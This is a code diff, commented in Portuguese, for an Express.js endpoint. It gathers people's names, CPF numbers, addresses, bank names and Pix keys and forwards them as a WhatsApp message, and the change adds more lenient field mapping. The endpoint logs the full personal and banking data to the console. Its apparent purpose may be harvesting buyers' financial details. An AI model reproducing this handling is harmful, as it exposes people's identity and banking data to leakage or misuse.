@@ -571,82 +571,100 @@ app.post("/api/enviar-dados-bancarios", async (req, res) => {
 
   try {
     const dados = req.body;
-    console.log("Dados recebidos:", JSON.stringify(dados));
+    console.log("Dados recebidos no backend:", JSON.stringify(dados, null, 2));
 
-    // Verificar se os dados são válidos (incluindo endereço e ID do produto)
-    if (
-      !dados.nome || 
-      !dados.email || 
-      !dados.telefone || 
-      !dados.cpf || 
-      !dados.banco || 
-      !dados.pix_tipo || 
-      !dados.pix_chave ||
-      !dados.cep ||
-      !dados.logradouro ||
-      !dados.numero ||
-      !dados.bairro ||
-      !dados.cidade ||
-      !dados.estado
-    ) {
-      console.error("Dados incompletos recebidos");
+    // Mapeando possíveis variações de nomes de campos vindos do frontend
+    const nome = dados.nome;
+    const email = dados.email;
+    const telefone = dados.telefone;
+    const cpf = dados.cpf;
+    const banco = dados.banco;
+    // Aceita tanto 'pix_tipo' quanto 'chave-pix-tipo'
+    const pix_tipo = dados.pix_tipo || dados["chave-pix-tipo"];
+    // Aceita tanto 'pix_chave' quanto 'chave-pix'
+    const pix_chave = dados.pix_chave || dados["chave-pix"];
+    
+    const cep = dados.cep;
+    const logradouro = dados.logradouro;
+    const numero = dados.numero;
+    const bairro = dados.bairro;
+    const cidade = dados.cidade || dados.localidade;
+    const estado = dados.estado || dados.uf;
+
+    // Verificação detalhada indicando qual campo faltou (ótimo para debug no console)
+    const camposFaltando = [];
+    if (!nome) camposFaltando.push("nome");
+    if (!email) camposFaltando.push("email");
+    if (!telefone) camposFaltando.push("telefone");
+    if (!cpf) camposFaltando.push("cpf");
+    if (!banco) camposFaltando.push("banco");
+    if (!pix_tipo) camposFaltando.push("pix_tipo (ou chave-pix-tipo)");
+    if (!pix_chave) camposFaltando.push("pix_chave (ou chave-pix)");
+    if (!cep) camposFaltando.push("cep");
+    if (!logradouro) camposFaltando.push("logradouro");
+    if (!numero) camposFaltando.push("numero");
+    if (!bairro) camposFaltando.push("bairro");
+    if (!cidade) camposFaltando.push("cidade");
+    if (!estado) camposFaltando.push("estado");
+
+    if (camposFaltando.length > 0) {
+      console.error("Campos faltando ou vazios no req.body:", camposFaltando);
       return res.status(400).json({
         success: false,
-        message: "Dados pessoais, de endereço ou bancários incompletos",
+        message: `Campos incompletos: ${camposFaltando.join(", ")}`,
       });
     }
 
     // Verificar status do WhatsApp antes de tentar enviar
-    if (!verificarStatusWhatsApp()) {
+    if (typeof verificarStatusWhatsApp === "function" && !verificarStatusWhatsApp()) {
       console.error("Tentativa de envio com WhatsApp desconectado");
       return res.status(503).json({
         success: false,
-        message:
-          "Serviço do WhatsApp indisponível no momento. Tente novamente mais tarde.",
+        message: "Serviço do WhatsApp indisponível no momento. Tente novamente mais tarde.",
       });
     }
 
-    // Formatar mensagem com os dados recebidos (incluindo endereço)
+    // Formatar mensagem com os dados validados
     const mensagem =
       `*Novos dados recebidos*\n\n` +
       `*ID da Venda:* ${dados.idProduto || 'Não informado'}\n\n` +
       `*Dados Pessoais:*\n` +
-      `Nome: ${dados.nome}\n` +
-      `Email: ${dados.email}\n` +
-      `Telefone: ${dados.telefone}\n` +
-      `CPF: ${dados.cpf}\n\n` +
+      `Nome: ${nome}\n` +
+      `Email: ${email}\n` +
+      `Telefone: ${telefone}\n` +
+      `CPF: ${cpf}\n\n` +
       `*Endereço:*\n` +
-      `CEP: ${dados.cep}\n` +
-      `Logradouro: ${dados.logradouro}, ${dados.numero}${dados.complemento ? ' (' + dados.complemento + ')' : ''}\n` +
-      `Bairro: ${dados.bairro}\n` +
-      `Cidade/UF: ${dados.cidade}/${dados.estado}\n\n` +
+      `CEP: ${cep}\n` +
+      `Logradouro: ${logradouro}, ${numero}${dados.complemento ? ' (' + dados.complemento + ')' : ''}\n` +
+      `Bairro: ${bairro}\n` +
+      `Cidade/UF: ${cidade}/${estado}\n\n` +
       `*Dados Bancários:*\n` +
-      `Banco: ${dados.banco}\n` +
-      `Tipo de Chave Pix: ${dados.pix_tipo}\n` +
-      `Chave Pix: ${dados.pix_chave}\n\n` +
+      `Banco: ${banco}\n` +
+      `Tipo de Chave Pix: ${pix_tipo}\n` +
+      `Chave Pix: ${pix_chave}\n\n` +
       `Enviado em: ${new Date().toLocaleString("pt-BR")}`;
 
     console.log("Mensagem formatada, iniciando envio...");
 
-    // Enviar mensagem para o WhatsApp
+    // Enviar mensagem para o WhatsApp (garantindo compatibilidade caso a função espere parâmetro ou objeto)
     const resultado = await enviarMensagemWhatsApp(mensagem);
     console.log("Resultado do envio:", resultado);
 
-    if (resultado.success) {
-      res.json({
+    if (resultado && resultado.success) {
+      return res.json({
         success: true,
         message: "Dados enviados com sucesso para o WhatsApp",
       });
     } else {
-      res.status(500).json({
+      return res.status(500).json({
         success: false,
         message: "Erro ao enviar mensagem para o WhatsApp",
-        error: resultado.message,
+        error: resultado ? resultado.message : "Erro desconhecido",
       });
     }
   } catch (error) {
     console.error("Erro ao processar dados bancários:", error);
-    res.status(500).json({
+    return res.status(500).json({
       success: false,
       message: "Erro ao processar sua solicitação",
       error: error.message,
